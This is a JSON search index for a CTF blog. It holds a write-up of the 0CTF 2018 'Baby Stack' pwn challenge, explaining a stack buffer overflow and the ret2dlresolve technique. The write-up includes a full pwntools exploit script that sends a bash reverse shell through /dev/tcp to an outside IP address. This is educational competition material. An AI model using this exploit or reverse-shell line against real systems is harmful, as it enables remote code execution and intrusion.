{
    "docs": [
        {
            "location": "/", 
            "text": "Welcome to HackNote\n\n\nAbout me\n\n\n\n\nss8651twtw\n\n\nBambooFox\n\n\nPwn, Reverse\n\n\n\n\nContact\n\n\n\n\nFaceBook\n\n\nTwitter", 
            "title": "Home"
        }, 
        {
            "location": "/#welcome-to-hacknote", 
            "text": "", 
            "title": "Welcome to HackNote"
        }, 
        {
            "location": "/#about-me", 
            "text": "ss8651twtw  BambooFox  Pwn, Reverse", 
            "title": "About me"
        }, 
        {
            "location": "/#contact", 
            "text": "FaceBook  Twitter", 
            "title": "Contact"
        }, 
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/", 
            "text": "0CTF 2018 Quals: Baby Stack\n\n\n\n\nChallenge link: \nbabystack\n\n\nCategory: Pwn\n\n\nWriteup: \nhttps://ss8651twtw.github.io/writeup/0CTF-2018-Quals:Baby-Stack/\n\n\n\n\n\n\nInfo leak is no longer required to exploit a stack overflow in 2018.\n\n\nEnjoy the babystack\n\n\n202.120.7.202:6666\n\n\nProtection\n\n\nArch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n\n\n\n\nAnalysis\n\n\n\n\npow.py\n\n\n\n\nIt is a wrapper of babystack.\nAdd proof-of-work and limiting the length of input is \n0x100\n; also pipe stdout and stderr to \n/dev/null\n.\n\n\n\n\nbabystack\n\n\n\n\nJust alarm and read buffer.\n\n\nssize_t\n \nsub_804843B\n()\n\n\n{\n\n  \nchar\n \nbuf\n;\n \n// [esp+0h] [ebp-28h]\n\n\n  \nreturn\n \nread\n(\n0\n,\n \nbuf\n,\n \n0x40u\n);\n\n\n}\n\n\n\nint\n \n__cdecl\n \nmain\n()\n\n\n{\n\n  \nalarm\n(\n0xAu\n);\n\n  \nsub_804843B\n();\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\nVulnerability\n\n\nNo canary found and we can read a lot of characters to buf.\n\n\n\n\nBuffer overflow\n in \nread(0, \nbuf, 0x40u)\n\n\n\n\nIdea\n\n\n\n\nno output function =\n cannot do information leak\n\n\nno libc provided =\n guessing function offset maybe hard\n\n\nNX enabled =\n read shell code and jump to execute cannot work\n\n\n\n\nAccording to the description, \"info leak is no longer required\", it means that we can use ret2dlresolve skill to pwn it!\n\n\nTry to solve by the following steps:\n\n\n\n\nuse rop to read fake data structures and ret2main\n\n\nuse ret2dlresolve to call \nsystem(\n/bin/sh\n)\n\n\n\n\nFake data structures:\n\n\n\n\nElf32_Rel\n\n\n\n\n/* Relocation table entry without addend (in section of type SHT_REL).  */\ntypedef struct\n{\n  Elf32_Addr        r_offset;                /* Address */\n  Elf32_Word        r_info;                        /* Relocation type and symbol index */\n} Elf32_Rel;\n\n\n\n\nhttps://code.woboq.org/userspace/glibc/elf/elf.h.html#633\n\n\n\n\nElf32_Sym\n\n\n\n\n/* Symbol table entry.  */\ntypedef struct\n{\n  Elf32_Word        st_name;                /* Symbol name (string tbl index) */\n  Elf32_Addr        st_value;                /* Symbol value */\n  Elf32_Word        st_size;                /* Symbol size */\n  unsigned char        st_info;                /* Symbol type and binding */\n  unsigned char        st_other;                /* Symbol visibility */\n  Elf32_Section        st_shndx;                /* Section index */\n} Elf32_Sym;\n\n\n\n\nhttps://code.woboq.org/userspace/glibc/elf/elf.h.html#518\n\n\nWorking flow about \n_dl_runtime_resolve\n\n\n     _dl_runtime_resolve(link_map, reloc_arg)\n                                       +\n          +-----------+                |\n          | Elf32_Rel | \n--------------+\n          +-----------+\n     +--+ | r_offset  |        +-----------+\n     |    |  r_info   | +----\n | Elf32_Sym |\n     |    +-----------+        +-----------+      +----------+\n     |      .rel.plt           |  st_name  | +--\n | system\\0 |\n     |                         |           |      +----------+\n     v                         +-----------+        .dynstr\n+----+-----+                      .dynsym\n| \nsystem\n |\n+----------+\n  .got.plt\n\n\n\n\n\n\n\n\nfake \nElf32_Rel\n\n\n\n\nr_offset\n writable (after resolving symbol write the actual address of function)\n\n\nr_info\n high 24 bits\n\n\n(r_info \n 8) * 16\n point to fake \nElf32_Sym\n (16 is size of \nElf32_Sym\n)\n\n\n\n\n\n\nr_info\n low 8 bits\n\n\nmust be \n0x07\n (R_386_JMP_SLOT)\n\n\n\n\n\n\n\n\n\n\n\n\nfake \nElf32_Sym\n\n\n\n\n.dynstr + st_name\n point to \nsystem\n string\n\n\n\n\n\n\n\n\nRead the fake \nElf32_Rel\n\u3001\nElf32_Sym\n structures and ret2main to call \n_dl_runtime_resolve\n.\n\n\n\n\nuse \nplt0\n\n\n\n\nDisassembly of section .plt:\n\n080482f0 \nread@plt-0x10\n:                                             // plt0\n 80482f0:       ff 35 04 a0 04 08       push   DWORD PTR ds:0x804a004 // push link_map\n 80482f6:       ff 25 08 a0 04 08       jmp    DWORD PTR ds:0x804a008 // jmp _dl_runtime_resolve\n\n\n\n\nWe can calculate the \nreloc_arg\n to make \n.rel.plt + reloc_arg\n point to our fake structures and jump to \nplt0\n, let it resolve symbol to \nsystem\n.\n\n\nAfter resolving the symbol, \n_dl_runtime_resolve\n will call the function.\n\n\nExploitation\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nhashlib\n \nimport\n \nsha256\n\n\nimport\n \ntime\n\n\n\n# r = process(\n./babystack\n)\n\n\nr\n \n=\n \nremote\n(\n202.120.7.202\n,\n \n6666\n)\n\n\n\ndef\n \nverify\n():\n\n    \ndata\n \n=\n \nr\n.\nrecvline\n()[:\n-\n1\n]\n\n    \nfor\n \ni\n \nin\n \nxrange\n(\n2\n \n**\n \n32\n):\n\n        \nif\n \nsha256\n(\ndata\n \n+\n \np32\n(\ni\n))\n.\ndigest\n()\n.\nstartswith\n(\n\\0\\0\\0\n):\n\n            \nbreak\n\n    \nr\n.\nsend\n(\np32\n(\ni\n))\n\n    \nlog\n.\ninfo\n(\nPOW is over\n)\n\n    \nsleep\n(\n0.5\n)\n\n\n\ndef\n \nsend\n(\ndata\n,\n \nlength\n):\n\n    \ntime\n.\nsleep\n(\n0.1\n)\n\n    \nr\n.\nsend\n(\ndata\n.\nljust\n(\nlength\n))\n\n\n\nplt0\n \n=\n \n0x80482f0\n\n\nrelplt\n \n=\n \n0x80482b0\n\n\ndynsym\n \n=\n \n0x80481cc\n\n\ndynstr\n \n=\n \n0x804822c\n\n\n\nmain\n \n=\n \n0x8048457\n\n\nread_plt\n \n=\n \n0x8048300\n\n\n\nbuf\n \n=\n \n0x804a500\n\n\n\nrop\n \n=\n \nflat\n(\n\n        \n# _dl_runtime_resolve call and reloc_arg\n\n        \nplt0\n,\n \nbuf\n \n-\n \nrelplt\n,\n \n# will resolve system\n\n        \n0xdeadbeef\n,\n \n# return address\n\n        \nbuf\n \n+\n \n36\n \n# parameter \n/bin/sh\n\n        \n)\n\n\n\ndata\n \n=\n \nflat\n(\n\n        \n# Elf32_Rel\n\n        \nbuf\n,\n \n0x7\n \n|\n \n((\nbuf\n \n+\n \n12\n \n-\n \ndynsym\n)\n \n/\n \n16\n)\n \n \n8\n,\n \n0xdeadbeef\n,\n \n# 0xdeadbeef is padding\n\n        \n# Elf32_Sym\n\n        \nbuf\n \n+\n \n28\n \n-\n \ndynstr\n,\n \n0\n,\n \n0\n,\n \n0x12\n,\n\n        \nsystem\n\\x00\\x00\n,\n\n        \n/bin/sh\n\\x00\n\n        \n)\n\n\n\nverify\n()\n\n\n\n# read data to buf\n\n\nsend\n(\na\n \n*\n \n44\n \n+\n \nflat\n(\nread_plt\n,\n \nmain\n,\n \n0\n,\n \nbuf\n,\n \n44\n),\n \n0x40\n)\n\n\nsend\n(\ndata\n,\n \n44\n)\n\n\n\n# use ret2dlresolve to call system(\n/bin/sh\n)\n\n\nsend\n(\na\n \n*\n \n44\n \n+\n \nrop\n,\n \n0x40\n)\n\n\n\n# make a reverse shell\n\n\nsend\n(\nbash -c \nbash -i \n/dev/tcp/35.201.141.84/80 0\n1\n,\n \n0x100\n)\n\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\nflag{return_to_dlresolve_for_warming_up}\n\n\nNote\n\n\nhttps://www.slideshare.net/AngelBoy1/re2dlresolve\n\n\nhttps://www.youtube.com/watch?v=wsIvqd9YqTI", 
            "title": "0CTF-2018-Quals:Baby-Stack"
        }, 
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#0ctf-2018-quals-baby-stack", 
            "text": "Challenge link:  babystack  Category: Pwn  Writeup:  https://ss8651twtw.github.io/writeup/0CTF-2018-Quals:Baby-Stack/    Info leak is no longer required to exploit a stack overflow in 2018.  Enjoy the babystack  202.120.7.202:6666", 
            "title": "0CTF 2018 Quals: Baby Stack"
        }, 
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#protection", 
            "text": "Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)", 
            "title": "Protection"
        }, 
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#analysis", 
            "text": "pow.py   It is a wrapper of babystack.\nAdd proof-of-work and limiting the length of input is  0x100 ; also pipe stdout and stderr to  /dev/null .   babystack   Just alarm and read buffer.  ssize_t   sub_804843B ()  { \n   char   buf ;   // [esp+0h] [ebp-28h] \n\n   return   read ( 0 ,   buf ,   0x40u );  }  int   __cdecl   main ()  { \n   alarm ( 0xAu ); \n   sub_804843B (); \n   return   0 ;  }", 
            "title": "Analysis"
        }, 
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#vulnerability", 
            "text": "No canary found and we can read a lot of characters to buf.   Buffer overflow  in  read(0,  buf, 0x40u)", 
            "title": "Vulnerability"
        }, 
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#idea", 
            "text": "no output function =  cannot do information leak  no libc provided =  guessing function offset maybe hard  NX enabled =  read shell code and jump to execute cannot work   According to the description, \"info leak is no longer required\", it means that we can use ret2dlresolve skill to pwn it!  Try to solve by the following steps:   use rop to read fake data structures and ret2main  use ret2dlresolve to call  system( /bin/sh )   Fake data structures:   Elf32_Rel   /* Relocation table entry without addend (in section of type SHT_REL).  */\ntypedef struct\n{\n  Elf32_Addr        r_offset;                /* Address */\n  Elf32_Word        r_info;                        /* Relocation type and symbol index */\n} Elf32_Rel;  https://code.woboq.org/userspace/glibc/elf/elf.h.html#633   Elf32_Sym   /* Symbol table entry.  */\ntypedef struct\n{\n  Elf32_Word        st_name;                /* Symbol name (string tbl index) */\n  Elf32_Addr        st_value;                /* Symbol value */\n  Elf32_Word        st_size;                /* Symbol size */\n  unsigned char        st_info;                /* Symbol type and binding */\n  unsigned char        st_other;                /* Symbol visibility */\n  Elf32_Section        st_shndx;                /* Section index */\n} Elf32_Sym;  https://code.woboq.org/userspace/glibc/elf/elf.h.html#518  Working flow about  _dl_runtime_resolve       _dl_runtime_resolve(link_map, reloc_arg)\n                                       +\n          +-----------+                |\n          | Elf32_Rel |  --------------+\n          +-----------+\n     +--+ | r_offset  |        +-----------+\n     |    |  r_info   | +----  | Elf32_Sym |\n     |    +-----------+        +-----------+      +----------+\n     |      .rel.plt           |  st_name  | +--  | system\\0 |\n     |                         |           |      +----------+\n     v                         +-----------+        .dynstr\n+----+-----+                      .dynsym\n|  system  |\n+----------+\n  .got.plt    fake  Elf32_Rel   r_offset  writable (after resolving symbol write the actual address of function)  r_info  high 24 bits  (r_info   8) * 16  point to fake  Elf32_Sym  (16 is size of  Elf32_Sym )    r_info  low 8 bits  must be  0x07  (R_386_JMP_SLOT)       fake  Elf32_Sym   .dynstr + st_name  point to  system  string     Read the fake  Elf32_Rel \u3001 Elf32_Sym  structures and ret2main to call  _dl_runtime_resolve .   use  plt0   Disassembly of section .plt:\n\n080482f0  read@plt-0x10 :                                             // plt0\n 80482f0:       ff 35 04 a0 04 08       push   DWORD PTR ds:0x804a004 // push link_map\n 80482f6:       ff 25 08 a0 04 08       jmp    DWORD PTR ds:0x804a008 // jmp _dl_runtime_resolve  We can calculate the  reloc_arg  to make  .rel.plt + reloc_arg  point to our fake structures and jump to  plt0 , let it resolve symbol to  system .  After resolving the symbol,  _dl_runtime_resolve  will call the function.", 
            "title": "Idea"
        }, 
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#exploitation", 
            "text": "#!/usr/bin/env python  from   pwn   import   *  from   hashlib   import   sha256  import   time  # r = process( ./babystack )  r   =   remote ( 202.120.7.202 ,   6666 )  def   verify (): \n     data   =   r . recvline ()[: - 1 ] \n     for   i   in   xrange ( 2   **   32 ): \n         if   sha256 ( data   +   p32 ( i )) . digest () . startswith ( \\0\\0\\0 ): \n             break \n     r . send ( p32 ( i )) \n     log . info ( POW is over ) \n     sleep ( 0.5 )  def   send ( data ,   length ): \n     time . sleep ( 0.1 ) \n     r . send ( data . ljust ( length ))  plt0   =   0x80482f0  relplt   =   0x80482b0  dynsym   =   0x80481cc  dynstr   =   0x804822c  main   =   0x8048457  read_plt   =   0x8048300  buf   =   0x804a500  rop   =   flat ( \n         # _dl_runtime_resolve call and reloc_arg \n         plt0 ,   buf   -   relplt ,   # will resolve system \n         0xdeadbeef ,   # return address \n         buf   +   36   # parameter  /bin/sh \n         )  data   =   flat ( \n         # Elf32_Rel \n         buf ,   0x7   |   (( buf   +   12   -   dynsym )   /   16 )     8 ,   0xdeadbeef ,   # 0xdeadbeef is padding \n         # Elf32_Sym \n         buf   +   28   -   dynstr ,   0 ,   0 ,   0x12 , \n         system \\x00\\x00 , \n         /bin/sh \\x00 \n         )  verify ()  # read data to buf  send ( a   *   44   +   flat ( read_plt ,   main ,   0 ,   buf ,   44 ),   0x40 )  send ( data ,   44 )  # use ret2dlresolve to call system( /bin/sh )  send ( a   *   44   +   rop ,   0x40 )  # make a reverse shell  send ( bash -c  bash -i  /dev/tcp/35.201.141.84/80 0 1 ,   0x100 )  r . interactive ()   flag{return_to_dlresolve_for_warming_up}", 
            "title": "Exploitation"
        }, 
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#note", 
            "text": "https://www.slideshare.net/AngelBoy1/re2dlresolve  https://www.youtube.com/watch?v=wsIvqd9YqTI", 
            "title": "Note"
        }
    ]
}